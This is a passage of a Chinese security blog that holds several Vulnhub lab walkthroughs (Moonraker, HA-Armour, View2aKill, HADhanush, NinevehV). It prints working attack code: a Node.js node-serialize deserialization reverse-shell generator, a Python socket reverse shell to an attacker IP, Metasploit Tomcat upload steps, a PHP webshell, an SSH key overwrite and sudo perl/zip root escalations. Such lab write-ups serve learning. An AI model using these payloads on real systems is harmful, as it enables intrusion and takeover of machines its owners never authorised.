this.indexOf(it) != -1; &#125;; &#125;</span></span><br><span class="line"><span class="string">function c(HOST,PORT) &#123;</span></span><br><span class="line"><span class="string">    var client = new net.Socket();</span></span><br><span class="line"><span class="string">    client.connect(PORT, HOST, function() &#123;</span></span><br><span class="line"><span class="string">        var sh = spawn('/bin/sh',[]);</span></span><br><span class="line"><span class="string">        client.write("Connected!\\n");</span></span><br><span class="line"><span class="string">        client.pipe(sh.stdin);</span></span><br><span class="line"><span class="string">        sh.stdout.pipe(client);</span></span><br><span class="line"><span class="string">        sh.stderr.pipe(client);</span></span><br><span class="line"><span class="string">        sh.on('exit',function(code,signal)&#123;</span></span><br><span class="line"><span class="string">          client.end("Disconnected!\\n");</span></span><br><span class="line"><span class="string">        &#125;);</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">    client.on('error', function(e) &#123;</span></span><br><span class="line"><span class="string">        setTimeout(c(HOST,PORT), TIMEOUT);</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">c(HOST,PORT);</span></span><br><span class="line"><span class="string">'''</span> % (IP_ADDR, PORT)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] Encoding"</span></span><br><span class="line">PAYLOAD = charencode(NODEJS_REV_SHELL)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"eval(String.fromCharCode(%s))"</span> % (PAYLOAD)</span><br></pre></td></tr></table></figure><p>这个Python脚本可以生成反序列化的具有弹shell功能的payload。我们新建一个文件将代码放进去。然后使用Python运行<code>python 1.py 192.168.183.138 1234</code>后面两个参数，第一个参数填kali攻击机的IP，第二个参数填kali接收shell的端口。<br><img src="25.png" alt="25"></p><p>因为3000端口的js代码会先将profile字段的值base64解码，然后进行反序列化，所以我们要反着来，确保执行完js代码后，结果是我们生成的这个payload。所以我们要先将生成的payload序列化，要进行这个操作，需要nodejs的node-serialize模块。所以我们要在kali里面安装nodejs。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nodejs  &#x2F;&#x2F;安装nodejs</span><br><span class="line">apt-get install npm  &#x2F;&#x2F;安装nodejs的包管理工具</span><br><span class="line">npm install node-serialize  &#x2F;&#x2F;用npm安装node序列化模块</span><br></pre></td></tr></table></figure><p>npm是node.js的一个包管理工具，就如同linux中的yum仓库，rpm包管理；如同python中的pip包管理工具一样。这些包管理工具都是予以使用的人们方便，同时解决各种包依赖之间的关系的。</p><p>把环境准备好后，我们使用nodejs执行下面的js代码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> y = &#123;</span><br><span class="line">rce : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;这里放生成的反序列化payload+;&#125; <span class="comment">//这个;不能少</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> serialize = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Serialized: \n"</span> + serialize.serialize(y));</span><br></pre></td></tr></table></figure><p>执行结果如下。<br><img src="26.png" alt="26"></p><p>现在我们有了序列化的payload，把payload拿去base64加密。<br><img src="27.png" alt="27"></p><p>记得加密前要在图中画圈的位置加一对()，加了弹shell函数才会执行。然后在<code>192.168.183.143:3000</code>页面刷新，burp抓包，然后把base64加密后的payload填到profile那里。<br><img src="28.png" alt="28"></p><p>然后在kali监听端口<code>nc -lvnp 1234</code>，然后回到burp点Go，shell就弹到kali了。<br><img src="29.png" alt="29"></p><p>收到shell，我们首先使用<code>python3 -c&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code>命令把shell变成交互式的，方便我们操作。然后我们首先去<code>/home</code>目录看看有没有什么用户信息。<br><img src="30.png" alt="30"></p><p>有四个用户，都进去看看，没有什么有用的信息。想想这个靶机用的是couchdb数据库，我们就去看看它的配置文件<code>/etc/couchdb</code>。<br><img src="31.png" alt="31"></p><p>提示我们文件被移到<code>opt/couchdb/etc</code>目录了，那我们去那个目录下面看看。<br><img src="32.png" alt="32"></p><p><code>default.ini</code>我们没有权限，看看<code>local.ini</code>配置文件。<br><img src="33.png" alt="33"></p><p>看红框的内容，我们得到了hugo账户的密码。切换到hugo，然后使用<code>sudo -l</code>看看能不能有更高的权限。<br><img src="34.png" alt="34"></p><p>系统提示，hugo不能执行sudo命令，这条路走不通，我们只能想其他办法提权。接着搜索其它目录，在<code>var/mail</code>发现有hugo的邮件，打开看看。<br><img src="35.png" alt="35"></p><p>告诉了我们root旧密码的hash，并且告诉了我们root新密码是旧密码+“VR00M”，那我们把root密码的hash存到一个空文件，命名hash，然后使用kali的John the Ripper password cracker（约翰开膛手密码破解）工具爆破root的旧密码<code>john hash</code>。<br><img src="36.png" alt="36"></p><p>成功获得root的旧密码<code>cyber</code>，所以root的新密码为<code>cyberVR00M</code>，切换成root，去拿flag。<br><img src="37.png" alt="37"></p>]]></content>
      
      
      <categories>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> vulnhub </tag>
            
            <tag> Moonraker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HA-Armour 靶机渗透</title>
      <link href="/2020/03/11/HA-Armour-%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
      <url>/2020/03/11/HA-Armour-%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="靶机信息"><a href="#靶机信息" class="headerlink" title="- 靶机信息"></a>- 靶机信息</h2><p>克劳从“复仇者联盟”超级秘密基地偷走了一些盔甲。猎鹰检查了清单，以下是丢失的装甲：</p><ul><li>绿巨人装甲</li><li>蜘蛛侠装甲</li><li>蚁人装甲</li><li>黑豹装甲</li><li>钢铁侠装甲</li></ul><p>克劳隐藏了这些装甲，现在看你的了。你可以使用渗透技能来找到全部装甲吗？ –史蒂夫·罗杰斯（Steve Rogers）上尉<br>       PS 克劳有将密码分为三部分并保存在不同位置的习惯。因此，如果你有一些发现，请结合起来继续前进。<br>       下载地址：<span class="exturl" data-url="aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGEtYXJtb3VyLDM3MC8=" title="https://www.vulnhub.com/entry/ha-armour,370/">https://www.vulnhub.com/entry/ha-armour,370/<i class="fa fa-external-link"></i></span></p><a id="more"></a><h2 id="渗透流程"><a href="#渗透流程" class="headerlink" title="- 渗透流程"></a>- 渗透流程</h2><p>首先惯例nmap扫描<code>nmap -sP 192.168.183.1/24</code><br><img src="1.png" alt="1"></p><p>然后扫描端口<code>nmap -sV -p- --open 192.168.183.142</code><br><img src="2.png" alt="2"></p><p>目前什么信息都没有，所以首先去看看80端口的web服务，访问网站，发现全部都是图片，查看下源码。发现了线索<br><img src="3.png" alt="3"></p><p>提示了69这个数字和一个<code>note.txt</code>，猜测这个69可能是一个端口，百度一下。69端口一般是TFTP服务。TFTP是Cisco公司开发的一个简单文件传输协议，类似于FTP。那么我们就去访问一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tftp 192.168.183.142</span><br><span class="line">get notes.txt</span><br></pre></td></tr></table></figure><p>notes.txt被下载到当前目录，打开。<br><img src="4.png" alt="4"></p><p>获得了蜘蛛侠装甲和一个线索2：<code>maybeevena</code>。然后试试一下dirb目录扫描，只扫除了<code>css</code>和<code>image</code>两个目录，没什么信息。再使用御剑扫一下有没有什么文件。<br><img src="5.png" alt="5"></p><p>发现有一个<code>file.php</code>。访问一下，发现页面空白，页面源码也是空白，但是这个文件名感觉像是有用的。所以猜测可能是文件包含，试一下，果然是文件包含。<br><img src="6.png" alt="6"></p><p>8080端口是apache tomcat，我们需要用户名和密码登录manager后台。所以我们就去看看<code>/etc/apache2/.htpasswd</code>文件。<code>.htpasswd</code>文件中账号以<code>用户名/加密密码</code>形式存在。<br><img src="7.png" alt="7"></p><p>没有账号信息，但是拿到了蚁人装甲和线索3：StarBucks。根据靶机信息的提示，我们还差线索1就可以组合成密码了。想想其他没尝试的还有8080，8009，SSH端口。8080就是正常的tomcat，8009无法访问，那我们就只能尝试一下SSH了，而且照这个情况来看，线索1应该是最好拿到的，所以我们尝试SSH，果然，不用登陆就可以获得线索。<br><img src="8.png" alt="8"></p><p>获得绿巨人装甲和线索1：TheOlympics。将三个线索组合起来，获得密码<code>TheOlympicsmaybeevenaStarBucks</code>。这个可能就是tomcat的登录密码。我们现在需要用户名，所以使用<code>cewl -w 1.txt http://192.168.183.142</code>爬取一下80端口那个页面的字符串做成字典。<br><img src="9.png" alt="9"></p><p>发现确实有可能存在用户名。我们可以尝试一下爆破tomcat的manager后台。打开metasploit，<code>search tomcat</code>，发现有用来进行manager登录的模块。<br><img src="10.png" alt="10"></p><p>使用use命令登录，然后使用<code>show options</code>查看我们需要填充什么信息。<br><img src="11.png" alt="11"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set PASSWORD TheOlympicsmaybeevenaStarBucks &#x2F;&#x2F;设置密码</span><br><span class="line">set RHOST 192.168.183.142 &#x2F;&#x2F;设置靶机IP</span><br><span class="line">set USER_FILE &#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;1.txt &#x2F;&#x2F;设置用户名字典</span><br><span class="line">run &#x2F;&#x2F;都设置好后就可以攻击了</span><br></pre></td></tr></table></figure><p>如果想快一点的话，可以把password，单独存入一个txt文件，然后把pass_file修改一下。<br><img src="12.png" alt="12"></p><p>爆破成功，得到用户名。用户名：<code>armour</code>。现在有了用户名和密码，我们就可以使用tomcat的第二个模块<code>exploit/multi/http/tomcat_mgr_upload</code>。这个模块在我们可以登录tomcat manager时可以执行payload帮我们获得shell。<br><img src="13.png" alt="13"></p><p>和刚才一样，设置用户名，密码，目标机IP，还有不要忘记确认端口号是否正确，设置好后run就可以了。<br><img src="14.png" alt="14"></p><p>现在虽然拿到了shell，但是这个shell的权限很低，甚至不是用户，所以我们要先提权成普通用户再想办法提权成root。所以首先去home目录看看有哪些用户可以用来提权。<br><img src="15.png" alt="15"><br><img src="16.png" alt="16"></p><p>这两个用户的目录里面都没有什么关于密码的信息，所以我们只能想其他办法提权。参考了一下大佬的思路，我们可以把apache的用户改成这两个用户，然后通过webshell弹shell获得用户的shell。百度一下，apache的用户信息记录在apache2.conf的配置文件里面。<br><img src="17.png" alt="17"></p><p>我们有权限修改，使用meterpreter的edit命令修改<code>edit apache2.conf</code><br><img src="18.png" alt="18"></p><p>把原本的注释，加上新的user和group，我们这里选择armour用户，因为armour用户有个文件名<code>sudo_as_admin_successful</code>的空文件，所以可能可以直接提权成root。把apache用户修改好后。我们上传一个webshell到网站的根目录。我这里选择的是kali自带的<code>/usr/share/webshells/php/</code>目录下的<code>php-reverse-shell.php</code>，将它复制到桌面，然后使用meterpreter的upload命令把webshell上传到网站根目录下<br><img src="19.png" alt="19"></p><p>对了，上传之前记得把shell的内容修改一下，把攻击机的IP改成你自己的攻击机IP，端口也可以修改。<br><img src="20.png" alt="20"></p><p>成功上传后，我们最后确保一下shell的权限，最好还是使用chmod把它的权限改成777，以确保shell可以被执行。我第一次上传时，上传的shell就是所有用户都没有x权限。因为meterpreter没有chmod命令，所以我们先使用<code>shell</code>，变成普通shell模式，再使用chmod命令。<br><img src="21.png" alt="21"></p><p>准备做好了，我们重启一下靶机，让apache变更下用户。然后在攻击机监听webshell填的端口，然后浏览器访问我们上传的webshell文件。<br><img src="22.png" alt="22"></p><p>前面的测试表明我上传的webshell成功执行了，但是连接被拒绝了，可能这个用户不能弹shell，所以我们换另一个用户aarti，再次修改apache2.conf文件，然后重启靶机。再监听。<br><img src="23.png" alt="23"></p><p>成功获得aarti用户的shell，使用<code>sudo -l</code>命令看看有什么权限。<br><img src="24.png" alt="24"></p><p>aarti可以用root的身份执行perl，那没什么好说的了，直接提权。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo perl -e <span class="string">'exec "/bin/bash";'</span></span><br></pre></td></tr></table></figure><p>拿到root权限后，去root目录找剩下的装甲<br><img src="25.png" alt="25"></p><p>我们找到了钢铁侠的装甲，但是遗失的装甲有5个，还差黑豹装甲没有找到。想想第二个装甲是在69端口拿到的，所以我们看看开启的端口。<br><img src="26.png" alt="26"></p><p>发现有一个8081端口，只能本地访问。使用<code>curl 127.0.0.1:8081</code>访问一下，但是靶机没有安装curl命令。所以我们使用meterpreter的portfwd命令把靶机的8081端口发送到我们的攻击机。<code>portfwd add -l 8081 -p 8081 -r 127.0.0.1</code>，然后在kali里面访问。<br><img src="27.png" alt="27"></p><p>找到最后一个装甲，本次渗透任务圆满完成。</p>]]></content>
      
      
      <categories>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> vulnhub </tag>
            
            <tag> HA系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>View2aKill 1靶机渗透测试</title>
      <link href="/2020/03/10/View2aKill-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
      <url>/2020/03/10/View2aKill-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h2 id="靶机信息"><a href="#靶机信息" class="headerlink" title="- 靶机信息"></a>- 靶机信息</h2><ul><li>使命：百万富翁的精神病学家Max Zorin是破坏硅谷计划的幕后策划者，该计划旨在夺取国际微芯片市场的控制权。获得root并阻止这个疯子实现目标！</li><li>难度：中级</li><li>flag：/root/flag/flag.sh</li><li>在vmware中使用，启用DHCP</li><li>学习目标：Web应用程序安全性，脚本，Linux枚举等。</li><li>官方地址：<span class="exturl" data-url="aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvdmlldzJha2lsbC0xLDM4Nw==" title="https://www.vulnhub.com/entry/view2akill-1,387">https://www.vulnhub.com/entry/view2akill-1,387<i class="fa fa-external-link"></i></span></li></ul><a id="more"></a><h2 id="渗透流程"><a href="#渗透流程" class="headerlink" title="- 渗透流程"></a>- 渗透流程</h2><p>首先使用nmap扫描，获得靶机ip<code>nmap -sP 192.168.183.1/24</code><br><img src="1.png" alt="1"></p><p>然后扫描靶机开启的端口<code>nmap -sV -p- --open 192.168.183.141</code><br><img src="2.png" alt="2"></p><p>发现开启了两个http服务，去看看，8191端口的没什么东西，先不管，80端口的也是只有一个动画。看下源代码。<br><img src="3.png" alt="3"></p><p>图片的来源是<code>pics/view4.gif</code>，那我们就去这个文件夹看看<br><img src="4.png" alt="4"></p><p>这个文件夹下面全部都是图片和动图，没什么有用的信息，先不管。然后访问一下robots.txt，看看能不能发现什么。<br><img src="5.png" alt="5"></p><p>发现了几个不允许爬虫爬取的目录，那么我们就去这几个目录里看看。在zorin目录里面发现了新东西。<br><img src="6.png" alt="6"></p><p>一个个点进去看，在第二个发现了有用的信息。<br><img src="7.png" alt="7"></p><p>发现了一个新目录，而且说新用户的sendrifugo密码为toor。这个信息先记着。然后其他的页面没发现什么有用的信息。再查看dev目录，发现了很多资料。<br><img src="8.png" alt="8"></p><p>发现了一个压缩包，下载下来，解压，里面有4个文件，一个一个打开看看。发现了一个重要信息。<br><img src="9.png" alt="9"></p><p>从这里可以知道用户名，密码的话提示是遥控雷管研发视频中的字符串的小写+HID阅读器的传输频率，那我们回到dev目录下面，打开那个remote_control（远程控制）的gif。<br><img src="10.png" alt="10"></p><p>知道字符串是helicopter（直升机），再查看dev目录下面的HID开头的那个pdf文件，那是阅读器的文档，找到传输频率。<br><img src="11.png" alt="11"></p><p>所以我们现在知道用户名和密码了。用户名：<code>chuck@localhost.com</code>密码<code>helicopter125</code>。</p><p>最后一个defense目录下也没什么有用的信息。那我们就去访问一下之前新发现的那个<code>/sentrifugo</code>目录。<br><img src="12.png" alt="12"></p><p>正好用我们收集的那个chuck的账户和密码登录。然后去exploit database搜索一下有没有可以利用的漏洞。<br><img src="13.png" alt="13"></p><p>确实有文件上传漏洞和sql注入等漏洞，但是都是验证不通过的的，我都试了一下，发现确实都不存在，这里面漏洞的路径我都没有权限访问。但是我还是找到了可以上传文件的地方。<br><img src="14.png" alt="14"></p><p>这里可以上传小于2m的文件，而且只是前端后缀名白名单，我们改下webshell的后缀，然后抓包再改回来就可以成功上传。但是我这里不知道为什么上传不了，上传的东西一闪而过就消失了。抓到的包也是空的，倒是每上传一次页面就会多一个form标签。<br><img src="15.png" alt="15"><br><img src="16.png" alt="16"></p><p>折腾了两三个小时，各种尝试都试了，发现连正常文件都无法上传，靶机重装了三次都没用，问了下我的小伙伴，发现他根本就没有这个情况，研究了好久，搞不明白，只能无奈放弃从这里上传webshell弹shell了。</p><p>思考了一下，我们还有一个SSH服务没有尝试，之前在那个网页看到一个密码toor还没有用到，就把这个当SSH的密码，去爆破一下看看，使用常用英文用户名字典成功爆破<br><img src="17.png" alt="17"></p><p>使用SSH连接<code>ssh bob@192.168.183.141</code>，进入系统后惯例四处翻翻。首先去看看home目录下面的用户文件夹。发现有四个用户。<br><img src="18.png" alt="18"></p><p>都进去看看。发现jenny目录里面有一个<code>dsktp_backup.zip</code>，我们解压一下，发现有<code>passsword.txt</code>和<code>todo.txt</code>两个文件，打开。<br><img src="20.png" alt="20"></p><p>得到jenny的SSH密码，而且告诉我们要把最终的脚本放到<code>max/aView.py</code>里面。那我们首先就换成jenny用户。进入max目录，发现还有个<code>note.txt</code>，打开看看<br><img src="21.png" alt="21"></p><p>这段话大致意思是在8191端口的一个网页可以远程执行max的计划，估计应该就是<code>aView.py</code>这个脚本，然后这个页面的网址是由<code>sha1(小写字母+view+两个数字)</code>得出来的，那我们就可以写个脚本把这个网址跑出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">a = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span>   //小写字母集合</span><br><span class="line">b = <span class="string">'0123456789'</span>                   //数字集合</span><br><span class="line">url = <span class="string">'http://192.168.183.141:8191/'</span>  //url的前半部</span><br><span class="line">list1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> b:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> b:</span><br><span class="line">            str1 = i+<span class="string">'view'</span>+j+k+<span class="string">'\n'</span>   </span><br><span class="line">   //拼接字符串,注意这个换行符一定要加,不然加密出来的结果和给的例子不一样</span><br><span class="line">            result = hashlib.sha1(str1.encode()).hexdigest() //sha1加密</span><br><span class="line">            list1.append(result)  //将加密的结果存入列表</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:   </span><br><span class="line">    str1 = url+i   //从列表中取出加密结果</span><br><span class="line">    response = requests.get(str1)  //拼接成完整url链接</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:  //状态码<span class="number">200</span>及页面存在就输出url</span><br><span class="line">        print(str1)</span><br></pre></td></tr></table></figure><p>但是跑出来的结果非常多<br><img src="22.png" alt="22"></p><p>我们随便访问一个链接看看。发现链接是正常的，但是只有一个动画，看看http头<br><img src="23.png" alt="23"></p><p>那我们就加个条件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (res.status_code == <span class="number">200</span>) <span class="keyword">and</span> (int(res.headers[<span class="string">'content-length'</span>])) &gt; <span class="number">167</span>:</span><br><span class="line">    // 要求状态码<span class="number">200</span>的同时content-length长度大于<span class="number">167</span></span><br></pre></td></tr></table></figure><p>再跑一遍，结果只有一个</p><p><code>http://192.168.183.141:8191/7f98ca7ba1484c66bf09627f931448053ae6b55a</code>，访问一下。<br><img src="24.png" alt="24"></p><p>点一下execute按钮，发现页面显示的内容是<code>aView.py</code>的内容。<br><img src="25.png" alt="24"></p><p>那我们把python弹shell的语句写入这个py文件，执行一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">s.connect((<span class="string">"192.168.183.138"</span>,<span class="number">1234</span>));</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>); </span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>); </span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>);</span><br><span class="line">p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>]);</span><br></pre></td></tr></table></figure><p>然后在kali监听1234端口<code>nc -lvnp 1234</code>然后去点一下按钮，成功拿到shell，然后使用<code>python -c&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code>把shell变成交互式的。<br><img src="26.png" alt="26"></p><p>拿到root权限，去拿flag。访问它的8007端口。渗透完成<br><img src="27.png" alt="27"></p>]]></content>
      
      
      <categories>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> vulnhub </tag>
            
            <tag> View2aKill </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HADhanush 靶机渗透</title>
      <link href="/2020/03/09/HADhanush-%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
      <url>/2020/03/09/HADhanush-%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="靶机信息"><a href="#靶机信息" class="headerlink" title="- 靶机信息"></a>- 靶机信息</h2><p>说明：Dhanush曾经是巅峰的的武器技术。它把战争重新定义到了一个新的高度，并在历史上的所有神话记载中都提到过。选择你的Dhanush，拉伸弓弦并射击以获取root！枚举是关键！！！！</p><p>下载：<span class="exturl" data-url="aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGEtZGhhbnVzaCwzOTYv" title="https://www.vulnhub.com/entry/ha-dhanush,396/">https://www.vulnhub.com/entry/ha-dhanush,396/<i class="fa fa-external-link"></i></span></p><a id="more"></a><h2 id="渗透流程"><a href="#渗透流程" class="headerlink" title="- 渗透流程"></a>- 渗透流程</h2><p>首先是基本流程，nmap扫一扫，看看靶机ip。<code>nmap -sP 192.168.183.1/24</code><br><img src="1.png" alt="1"></p><p>确认靶机ip为192.168.183.139，接着就是扫端口了。<code>nmap -sV -p- --open 192.168.183.139</code>。<br><img src="2.png" alt="2"></p><p>发现开启了80端口和65345端口，80是web服务，65345是ssh服务。那就去web的网站看一看。发现网站就是Dhanush的介绍。然后想到靶机说的枚举是关键。看来是要爆破ssh了。首先收集字典。使用<code>cewl 192.168.183.139 -w 1.txt</code>将网站上面的所有字符串收集起来作为爆破的字典。<br><img src="3.png" alt="3"></p><p>里面有些乱码字符，可以不用管。有了字典就可以开始爆破了，使用hydra工具爆破<code>hydra -L 1.txt -P 1.txt -e ns -t 60 -s 65345 192.168.183.139 ssh</code>，-e后面的ns分别表示密码可以为空和密码和用户名可以相同，-t 设置线程数。<br><img src="4.png" alt="4"></p><p>爆破成功得到账号：<code>pinak</code>，密码：<code>Gandiv</code></p><p>连接SSH，<code>ssh pinak@192.168.183.139 -p 65345</code><br><img src="5.png" alt="5"></p><p>进去之后就可以四处瞅瞅了，发现home文件夹下面有三个用户dhanush、pinak、sarang，看看他们的目录。<br><img src="13.png" alt="13"><br><img src="6.png" alt="6"><br><img src="14.png" alt="14"></p><p>发现dhanush用户下有一个空文件，文件名是<code>sudo_as_admin_successful</code>说明了这个用户有可能可以直接sudo成root，那我们就可以留意一下有没有哪里记录着这个用户的密码。sarang用户有<code>.ssh</code>的文件夹，说明这个用户可以使用私钥无密码登录SSH。</p><p>然后我们使用<code>sudo -l</code>看看pinak用户有什么权限。<br><img src="7.png" alt="7"></p><p>可以看到pinak用户可以无需密码以sarang用户的身份使用cp命令，那么后面的渗透思路就确定了，因为sarang用户可以公私钥登录，而且pinak用户可以用sarang的权限使用cp命令。所以我们生成新的rsa公私钥，然后将新的公钥移动到sarang用户的<code>.ssh</code>文件夹下覆盖掉原有的公钥，我们就可以使用新生成的私钥登录sarang账户了。</p><p>这里简单科普一下SSH的两种登录方式：</p><ol><li>密码登录：<br><img src="15.png" alt="15"></li><li>基于密钥登录：<br><img src="16.png" alt="16"></li></ol><p>首先使用命令<code>ssh-keygen</code>生成新的rsa公私钥，密码设为123456<br><img src="8.png" alt="8"></p><p>然后进入<code>.ssh</code>目录，将新生成的公钥从隐藏目录移到<code>/home/pinak</code>目录下，因为sarang没有权限进入pinak的<code>.ssh</code>文件夹，再使用命令<code>sudo -u sarang /bin/cp id_rsa.pub /home/sarang/.ssh/authorized_keys</code>将新生成的公钥覆盖掉sarang用户原本的authorized_keys文件。成功后，用私钥连接sarang账户<code>ssh sarang@192.168.183.139 -p 65345 -i id_rsa</code><br><img src="9.png" alt="9"></p><p>成功登录，使用<code>sudo -l</code>查看权限<br><img src="10.png" alt="10"></p><p>sarang用户可以无需密码以root身份执行zip命令，又因为使用zip命令可以执行系统命令，所以我们可以直接提权。先创建一个1.txt文件，然后<code>sudo /usr/bin/zip 1.zip 1.txt -T --unzip-command=&quot;sh -c /bin/bash&quot;</code>。这个命令的意思是将1.txt压缩，然后解压的时候弹一个shell，因为是以root的身份执行的，所以弹出的shell就是root权限。<br><img src="11.png" alt="11"></p><p>可以看到，我们现在已经是root权限了，然后去root文件夹下拿flag<br><img src="12.png" alt="12"></p><p>目标达成后，我又想起了那个dhanush用户，去网上找了找，发现大家都是zip本地提权，没有人用dhanush提权成root的，可能这只是用来迷惑我们的吧。</p>]]></content>
      
      
      <categories>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> vulnhub </tag>
            
            <tag> HA系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NinevehV 0.3 靶机渗透</title>
      <link href="/2020/03/08/NinevehV-0-3-%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
      <url>/2020/03/08/NinevehV-0-3-%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<p>vulnhub的NinevehV 0.3 靶机渗透记录</p><a id="more"></a><h1 id="NinevehV-0-3-靶机渗透"><a href="#NinevehV-0-3-靶机渗透" class="headerlink" title="- NinevehV 0.3 靶机渗透"></a>- NinevehV 0.3 靶机渗透</h1><p>本次渗透目标为vulnhub的NinevehV 0.3靶机，靶机的ip是固定的<code>192.168.0.150</code>，所以装载这个靶机时，记得在vmware添加一个<code>192.168.0</code>网段的网卡，并将靶机和攻击机的网卡皆设置成这个网卡，具体原因，渗透测试的过程中会说明。好了开始渗透。</p><p>因为靶机的ip固定，所以本次就不用扫网段确认靶机ip了，我们直接使用<code>nmap -sV  -p- --open 192.168.0.150</code>，收集靶机的开放端口信息<br><img src="1.png" alt="1"></p><p>发现开启了80和443端口，及http和https网页服务，那就去这两个网页看看，发现除了一张图和几句话，什么有用的信息都没有。那么我们就需要爆破一下这两个网站的目录，看看有没有其他有用的页面。使用dirb工具扫描<code>dirb http://192.168.0.150</code><br><img src="2.png" alt="2"><br><img src="3.png" alt="3"></p><p>http页面没有扫出什么有用的东西，先不管，看看https的那个db路径，实现是一个数据库的的后台管理的登录页面。<br><img src="4.png" alt="4"></p><p>首先用<code>searchsploit phpLiteAdmin</code>看看这个系统有没有已发布的漏洞。<br><img src="5.png" alt="5"></p><p>果然有漏洞，而且系统版本就是有漏洞的那个版本，那我们就去exploit database查看一下这个漏洞是什么。<br><img src="6.png" alt="6"></p><p>大致意思就是这个数据库管理系统可以创建后缀名为php的数据库文件，然后将php代码写在数据库的表中，就可以访问这个php文件然后执行里面的代码。但是这都是要登录以后才可以执行的操作。</p><p>所以我们现在先爆破出登录密码，是时候检测一下你们字典强不强了233<br><img src="7.png" alt="7"></p><p>爆破出来密码为<code>password123</code>，是弱密码。登录进去以后，创建一个1.php的数据库，在里面写入一句话木马。<br><img src="8.png" alt="8"><br><img src="9.png" alt="9"></p><p>木马上传好了，但是我们发现这个存储的位置根本就不在网站的根目录下面，我们无法访问，这个时候我们就需要一个文件包含漏洞，但https这个服务里面没有别的页面了。这个时候就可以看看http服务的页面了，之前我们扫出来的就只有一个phpinfo页面，没有别的有用信息，这次我们换个更大字典再扫一次，看看有没有收获。<br><img src="10.png" 